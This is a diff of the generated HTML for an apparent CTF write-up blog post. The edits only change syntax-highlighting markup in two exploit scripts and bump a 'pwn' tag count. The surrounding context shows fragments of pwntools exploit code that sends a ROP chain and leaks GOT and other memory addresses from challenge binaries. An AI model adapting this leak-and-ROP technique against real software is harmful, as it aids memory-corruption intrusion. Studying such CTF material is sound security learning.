@@ -230,9 +230,9 @@ The ropchain look like this:</p>
 </code></pre></div></div>
 
 <p>The whole exploit look like this:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python2.7</span>
-<span class="c"># -*- coding: utf-8 -*-</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2.7
+# -*- coding: utf-8 -*-
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 
@@ -259,7 +259,7 @@ The ropchain look like this:</p>
         <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span>
         <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"yourself</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
         <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>
-        <span class="k">print</span> <span class="s">"[x] Leak "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">+</span> <span class="s">" bytes at "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="s">" : "</span> <span class="o">+</span> <span class="s">":"</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">"{:02x}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s">"[x] Leak "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">+</span> <span class="s">" bytes at "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="s">" : "</span> <span class="o">+</span> <span class="s">":"</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">"{:02x}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
         <span class="k">return</span> <span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
 
     <span class="k">def</span> <span class="nf">start_binary</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
@@ -365,9 +365,9 @@ The ropchain look like this:</p>
 </code></pre></div></div>
 
 <p>The whole exploit look like this:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python2.7</span>
-<span class="c"># -*- coding: utf-8 -*-</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2.7
+# -*- coding: utf-8 -*-
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 
@@ -421,7 +421,7 @@ The ropchain look like this:</p>
         <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"rules...:( </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
         <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
         <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span>
-        <span class="k">print</span> <span class="s">"[x] Leak "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">+</span> <span class="s">" bytes at "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="s">" : "</span> <span class="o">+</span> <span class="s">":"</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">"{:02x}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s">"[x] Leak "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">+</span> <span class="s">" bytes at "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="s">" : "</span> <span class="o">+</span> <span class="s">":"</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">"{:02x}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
         <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"(1-3)</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
         <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
 
@@ -503,7 +503,7 @@ The ropchain look like this:</p>
 			 
 				<li>
 					<a href="/tags.html#pwn-ref">
-					pwn <span>(10)</span>
+					pwn <span>(11)</span>
 					
 					</a>
 				</li>
